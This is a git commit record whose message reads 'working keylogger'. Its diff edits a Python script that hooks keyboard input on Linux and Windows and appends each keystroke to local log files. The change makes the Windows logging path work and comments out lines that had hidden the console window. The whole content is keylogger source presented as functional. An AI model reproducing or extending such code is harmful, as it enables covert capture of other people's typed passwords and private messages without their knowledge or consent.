2035899772b28eeb63bb72d8d8555695236c8f83
Shiv Bhatia <shivdev@live.ca>
2018-09-15 11:11:28 -0700

    working keylogger

--- keylogger.py
+++ keylogger.py
@@ -4,7 +4,7 @@ print(sys.platform)
 
 if sys.platform == 'linux':
 	from Dependencies import pyxhook
-	log_file='/home/darthvader/Documents/file.log'
+	log_file='/root/Documents/file.log'
 	def OnKeyPress(event):
 		fob=open(log_file,'a')
 		fob.write(event.Key)
@@ -23,31 +23,31 @@ if sys.platform == 'linux':
 	#start the session
 	new_hook.start()
 else:
-	import pyhook, pywin32
+	import pyHook
 	import win32api
 	import win32console
 	import win32gui
 	import pythoncom
 	
-	win=win32console.GetConsoleWindow()
-	win32gui.ShowWindow(win,0)
+	#win=win32console.GetConsoleWindow()
+	#win32gui.ShowWindow(win,0)
  
 	def OnKeyboardEvent(event):
-		if event.Ascii==5:
-			_exit(1)
 		if event.Ascii !=0 or 8:
 		#open output.txt to read current keystrokes
-			f=open('c:\output.txt','r+')
-			buffer=f.read()
-			f.close()
+		#	f=open('c:\output.txt','r+')
+		#	buffer=f.read()
+		#	f.close()
 			#open output.txt to write current + new keystrokes
-			f=open('c:\output.txt','w')
+			f=open('c:\output.txt','a')
 			keylogs=chr(event.Ascii)
 			if event.Ascii==13:
 				keylogs='/n'
-			buffer+=keylogs
-			f.write(buffer)
+			#buffer+=keylogs
+			f.write(keylogs)
+			f.write('\n')
 			f.close()
+			return True
 	# create a hook manager object
 	hm=pyHook.HookManager()
 	hm.KeyDown=OnKeyboardEvent
